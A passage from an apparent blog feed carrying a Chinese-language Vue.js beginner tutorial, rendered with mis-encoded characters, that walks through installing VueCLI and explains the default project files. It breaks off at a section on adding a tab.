<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js ä»å…¥å‘åˆ°å…¥åœŸ]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-ä»å…¥å‘åˆ°å…¥åœŸ">Vue.js ä»å…¥å‘åˆ°å…¥åœŸ</h1>
<p>è¿‘å¹´æ¥å‰ç«¯é¢†åŸŸå‘å±•é£é€Ÿï¼Œä»æœ€æ—©çš„ç›´æ¥å†™html, js, css åˆ°ä½¿ç”¨jQueryå¿«é€Ÿå¼€å‘ï¼Œå†åˆ°è¿‘å¹´æ¥ä½¿ç”¨Vuejsï¼ŒReactjs å®ç°å·¥ç¨‹åŒ–å¼€å‘ï¼Œä¹Ÿå°±çŸ­çŸ­åå‡ å¹´ã€‚è™½ç„¶å‰ç«¯é¡¹ç›®ç»“æ„è¶Šæ¥è¶Šå¤æ‚ï¼Œä½†ä¹Ÿè¶Šæ¥è¶Šè§„èŒƒï¼Œæ¸…æ™°ï¼Œæ›´åŠ å·¥ç¨‹åŒ–ã€‚å½“å‰è¾ƒä¸ºæµè¡Œçš„å‰ç«¯æ¡†æ¶æœ‰Vuejsã€Reactjsã€Angularjs ç­‰ï¼Œè€ŒVuejsç”±äºå…¶çµ(zhong)æ´»(wen)è½»(wen)ä¾¿(dang)ï¼Œè¾ƒä¸ºæµè¡Œã€‚è™½ç„¶Vuejsæœ‰å®Œå–„çš„ä¸­æ–‡æ–‡æ¡£ï¼Œä½†æ–‡æ¡£ä¸»è¦åœ¨ä»‹ç»å…¶ç”¨æ³•ï¼Œç¼ºå°‘å¦‚ä½•å®ç°ä¸€ä¸ªå®Œæ•´é¡¹ç›®çš„æŒ‡å¯¼ï¼Œæœ¬æ–‡å°±ä»‹ç»å¦‚ä½•ç”¨Vuejsåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„å‰ç«¯é¡¹ç›®ï¼Œå¹¶ä¸åç«¯è¿›è¡Œäº¤äº’ã€‚</p>
<p><strong>æœ¬æ–‡åŸºäº<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>åŠ<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>æ‰€éœ€æŠ€æœ¯æ ˆï¼šhtml, javascript, cssåŸºç¡€çŸ¥è¯†ï¼Œå…¶ä¸­jså»ºè®®äº†è§£<strong>ES2015</strong>æ ‡å‡†ï¼Œç‰¹åˆ«è¦æŒæ¡<strong>promise</strong>çš„ä½¿ç”¨</li>
<li>ä½¿ç”¨çš„å·¥å…·ï¼š<del>å®‡å®™ç¬¬ä¸€ç¼–è¾‘å™¨</del> VSCode â€”â€” ç°åœ¨å¯¹vueé¡¹ç›®çš„æ”¯æŒå·²ç»å¾ˆå¥½äº†ï¼Œå¯ä»¥è‡ªåŠ¨å®‰è£…vueé¡¹ç›®éœ€è¦çš„æ’ä»¶</li>
</ol>
<h1 id="0x0-å®‰è£…">0x0 å®‰è£…</h1>
<blockquote>
<p>æ¨èä½¿ç”¨<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>ä»£æ›¿npmä½œä¸ºåŒ…ç®¡ç†å™¨</p>
</blockquote>
<h2 id="å®‰è£…vuecli">å®‰è£…VueCLI</h2>
<blockquote>
<p>VueCLIæ˜¯Vuejså®˜æ–¹æ¨å‡ºçš„é¡¹ç›®è„šæ‰‹æ¶å·¥å…·ï¼Œå¯ä»¥æ–¹ä¾¿çš„åˆ›å»ºã€ç®¡ç†Vueé¡¹ç›®ï¼Œè¿˜æä¾›ä¼˜é›…çš„webç®¡ç†ç•Œé¢</p>
</blockquote>
<p>å…¨å±€å®‰è£…<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="å®‰è£…vue-devtools">å®‰è£…Vue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> æ˜¯vueå®˜æ–¹çš„æµè§ˆå™¨å¼€å‘æ’ä»¶ï¼Œå¯ä»¥æ–¹ä¾¿çš„åœ¨æµè§ˆå™¨ä¸­è°ƒè¯•vueåº”ç”¨</p>
</blockquote>
<p>Vue-devtools æä¾›å¤šå¹³å°çš„æµè§ˆå™¨æ’ä»¶å¯ä»¥ç›´æ¥å®‰è£…ä½¿ç”¨</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-æ–°å»ºé¡¹ç›®">0x1 æ–°å»ºé¡¹ç›®</h1>
<p>ä½¿ç”¨ <code>vue create vue_demo</code> åˆ›å»ºæ–°é¡¹ç›®ï¼Œæ¥ä¸‹æ¥ä¼šå‡ºç°ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œå¸®ä½ é…ç½®é¡¹ç›®ã€‚</p>
<p><strong>æ³¨æ„æ­¤å¤„ä¸è¦ä½¿ç”¨é»˜è®¤çš„é…ç½®ï¼å…·ä½“é…ç½®å‚è€ƒä¸‹å›¾</strong></p>
<blockquote>
<p>å‘x1 é»˜è®¤çš„é…ç½®ååˆ†ç®€å•ï¼Œæ–°æ‰‹ç»å¸¸ä¸çŸ¥é“æ€ä¹ˆå†™å¤šé¡µé¢ï¼Œå¼„ä¸æ˜ç™½é¡¹ç›®æ€ä¹ˆç»„ç»‡çš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå®šä¹‰é…ç½®ï¼Œæ·»åŠ vue-routeræ’ä»¶å®ç°å¤šé¡µé¢è·³è½¬</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-é¡¹ç›®æ¡†æ¶">0x2 é¡¹ç›®æ¡†æ¶</h1>
<p>æ­¤æ—¶é¡¹ç›®å·²ç»åˆ›å»ºæˆåŠŸï¼Œå¦‚æœä½ æŒ‰ç…§æç¤ºå¯åŠ¨é¡¹ç›®å°±èƒ½çœ‹åˆ°ç»å…¸çš„vueå¯åŠ¨é¡µ</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>å½“å‰çš„é¡¹ç›®ç»“æ„å¦‚ä¸‹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     é¡¹ç›®æ ¹ç›®å½•
â”œâ”€â”€ README.md 
â”œâ”€â”€ babel.config.js
â”œâ”€â”€ package.json      é¡¹ç›®ä¸»é…ç½®æ–‡ä»¶
â”œâ”€â”€ public            å…¬å…±èµ„æºæ–‡ä»¶å¤¹
â”‚   â”œâ”€â”€ favicon.ico
â”‚   â””â”€â”€ index.html    å…¥å£html
â”œâ”€â”€ src               æºç æ ¹ç›®å½•
â”‚   â”œâ”€â”€ App.vue       å…¥å£æ–‡ä»¶
â”‚   â”œâ”€â”€ assets        èµ„æºæ–‡ä»¶å¤¹
â”‚   â”‚   â””â”€â”€ logo.png
â”‚   â”œâ”€â”€ components    ç»„ä»¶æ–‡ä»¶å¤¹
â”‚   â”‚   â””â”€â”€ HelloWorld.vue 
â”‚   â”œâ”€â”€ main.js       å…¥å£é…ç½®æ–‡ä»¶
â”‚   â”œâ”€â”€ router.js     è·¯ç”±æ–‡ä»¶
â”‚   â”œâ”€â”€ store.js      çŠ¶æ€ç®¡ç†
â”‚   â””â”€â”€ views         é¡µé¢æ–‡ä»¶å¤¹
â”‚       â”œâ”€â”€ About.vue
â”‚       â””â”€â”€ Home.vue
â””â”€â”€ yarn.lock         ä¾èµ–æ–‡ä»¶
</code></pre></div><p>åœ¨ä¸‹é¢çš„ç« èŠ‚å…·ä½“ä»‹ç»å„ä¸ªæ–‡ä»¶ã€æ–‡ä»¶å¤¹çš„ç”¨å¤„å’Œå¦‚ä½•ç»„ç»‡é¡¹ç›®ã€‚</p>
<h1 id="0x3-é¡¹ç›®ç»“æ„">0x3 é¡¹ç›®ç»“æ„</h1>
<p>ç”¨vueå¼€å‘çš„é¡¹ç›®ä¸€èˆ¬æ˜¯<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(å•é¡µåº”ç”¨)</a>ï¼Œé€šè¿‡åŠ¨æ€é‡å†™å½“å‰é¡µé¢æ¥ä¸ç”¨æˆ·äº¤äº’ï¼Œè€Œä¸ä¼šé‡æ–°åŠ è½½æ•´ä¸ªæ–°é¡µé¢ã€‚æ‰€ä»¥è¦ç»„ç»‡å¤šé¡µé¢å°±è¦é€šè¿‡vue-routeræ¥ç»„ç»‡é¡µé¢ï¼Œè€Œvuexç”¨æ¥ä¿å­˜çŠ¶æ€ã€‚</p>
<p>ä½œä¸ºå•é¡µåº”ç”¨ï¼Œå½“ç„¶éœ€è¦ä¸€ä¸ªå…¥å£htmlæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™æ˜¯é»˜è®¤ç”Ÿæˆçš„ <code>index.html</code> ï¼Œè€Œç¼–è¯‘å¥½çš„æ–‡ä»¶ï¼ˆç½‘é¡µå†…å®¹ï¼‰ä¼šè¢«è‡ªåŠ¨æ³¨å…¥åˆ° `` ä¸­ï¼Œä¹Ÿå°±æ„å‘³ç€è¦ä½¿ç”¨vueå¼€å‘çš„åº”ç”¨ï¼Œæµè§ˆå™¨å¿…é¡»æ”¯æŒjsã€‚</p>
<p>è€Œ#appæ‰€ç»‘å®šçš„vueå®ä¾‹ï¼Œåˆ™ä½äº <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// ä½¿ç”¨vue-routeræ’ä»¶
</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// ä½¿ç”¨vuexæ’ä»¶
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// æ¸²æŸ“é¡µé¢
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// ç»‘å®šåˆ° index.html -&gt; div#app
</span></code></pre></div><p>å…¶ä¸­æ¸²æŸ“çš„é¡µé¢ä½äº <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue æ˜¯vueä¸­çš„<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">å•æ–‡ä»¶ç»„ä»¶</a>ï¼Œå°† <code>html css javascript</code> é›†åˆåœ¨åŒä¸€ä¸ªæ–‡ä»¶ï¼Œä¾¿äºç»„ç»‡ç®¡ç†</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>å…¶ä¸­ <code>æ˜¯é¡µé¢çš„ `html` å…ƒç´ ï¼Œ`style` æ˜¯æ ·å¼å…ƒç´ ï¼Œè¿˜å¯ä»¥æ·»åŠ ä¸€ä¸ª `javascript` ä¸ºjså…ƒç´ ã€‚å…¶ä¸­</code> æ˜¯è·¯ç”±ç»„ä»¶ï¼Œä¼šè¢«è‡ªåŠ¨æ¸²æŸ“æˆå½“å‰è·¯ç”±å¯¹åº”çš„é¡µé¢</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>å¦‚ <code>http://localhost:8080/</code> ä¸‹ <code>è¢«æ¸²æŸ“æˆ `home` é¡µé¢ï¼Œ`http://localhost:8080/about` ä¸‹</code> è¢«æ¸²æŸ“æˆ <code>about</code> é¡µé¢ã€‚</p>
<blockquote>
<p>æŠ€å·§ è¿™é‡ŒåŠ è½½ç»„ä»¶ä½¿ç”¨å‡½æ•°åŠ è½½ï¼Œå°±å¯ä»¥å®ç°æ‡’åŠ è½½ä»¥ä¼˜åŒ–æ€§èƒ½ã€‚</p>
</blockquote>
<hr>
<p><code>src/views/</code> åˆ™æ˜¯ä¿å­˜é¡µé¢æ–‡ä»¶ï¼Œä¾‹å¦‚</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™å°±æ˜¯è·¯ç”± <code>home</code> å¯¹åº”çš„é¡µé¢ï¼Œå…¶ä¸­ç”¨åˆ°äº† <code>HelloWorld</code> ç»„ä»¶ï¼Œéœ€è¦åœ¨jsä¸­å¼•å…¥ã€‚</p>
<hr>
<p><code>src/components/</code> é‡Œé¢ä¿å­˜å¯å¤ç”¨çš„ç»„ä»¶ï¼Œä¾‹å¦‚ä¸Šé¢çš„ `` å°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç»„ä»¶ï¼ˆcomponentï¼‰</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ç»„ä»¶ï¼Œç»“æ„å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å•æ–‡æœ¬ç»„ä»¶ï¼Œè¯´æ˜ç»„ä»¶å°±æ˜¯æŠŠä¸€éƒ¨åˆ†é¡µé¢é€»è¾‘æŠ½å‡ºæ¥ç»„æˆä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯åˆ†ç¦»ä¸é¡µé¢æ— å…³çš„ç»„ä»¶ï¼Œä½¿é¡µé¢é€»è¾‘æ›´åŠ æ¸…æ™°ï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå¤ç”¨ç»„ä»¶ã€‚å¦‚æœæœ‰ä»¥ä¸‹æƒ…å†µï¼Œæˆ‘å»ºè®®æŠŠéƒ¨åˆ†ä»£ç åˆ†ç¦»æˆç‹¬ç«‹çš„ç»„ä»¶ï¼š</p>
<ol>
<li>éœ€è¦å¤šæ¬¡å¤ç”¨çš„ç»„ä»¶ï¼Œå¦‚åŸºç¡€æŒ‰é’®ã€è¡¨å•ç­‰</li>
<li>è¾ƒä¸ºå¤æ‚ä½†ä¸é¡µé¢é€»è¾‘æ— å…³çš„ï¼Œå¦‚é¡µé¢çš„Headerã€Footerç­‰</li>
</ol>
<blockquote>
<p>æŠ€å·§ åœ¨ <code>style</code> è¡¨æƒ…ä¸Šæ·»åŠ  <code>scoped</code> å±æ€§å¯ä»¥é™åˆ¶CSSç”Ÿæ•ˆèŒƒå›´ä¸ºè¯¥ç»„ä»¶ï¼Œä¸ä¼šå½±å“å…¶ä»–å…ƒç´ ï¼Œåœ¨ç¼–è¯‘æ—¶vueè§£é‡Šå™¨ä¼šç»™è¿™äº›csså±æ€§åŠ ä¸Šéšæœºçš„hashä¿è¯å”¯ä¸€</p>
</blockquote>
<hr>
<p>vueè¿˜æä¾›äº†ä¸€ä¸ªçŠ¶æ€ç®¡ç†æ¨¡å¼ <a href="https://vuex.vuejs.org/zh/">vuex</a>ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„ç®¡ç†æ‰€æœ‰ç»„ä»¶çš„çŠ¶æ€ã€‚å¯¹åº”æ–‡ä»¶ <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>ç”±äºæˆ‘è¿˜æ²¡ç”¨è¿‡ <code>vuex</code> æ‰€ä»¥è‡ªå·±çœ‹æ–‡æ¡£å§</del></p>
<p>å¯¹äºç®€å•çš„åº”ç”¨ä¹Ÿå¯ä»¥ä¸ç”¨ <code>vuex</code> ï¼Œä¸€ä¸ªç®€å•çš„ <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> æ¨¡å¼</a> å°±è¶³å¤Ÿäº†</p>
<h1 id="0x4-å¼€å‘æŒ‡å¼•">0x4 å¼€å‘æŒ‡å¼•</h1>
<p>æœ‰äº†ä¸Šé¢çš„åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™ä»£ç äº†ï¼Œè¿™é‡Œä»¥æ·»åŠ ä¸€ä¸ª <code>Foo</code> é¡µé¢å±•ç¤ºä»è¿œç«¯è·å¾—çš„æ•°æ®ä¸ºä¾‹</p>
<h2 id="1-ç»™é¡µé¢æ·»åŠ ä¸€ä¸ª-tab">1. ç»™é¡µé¢æ·»åŠ ä¸€ä¸ª <code>Tab</code></h2>
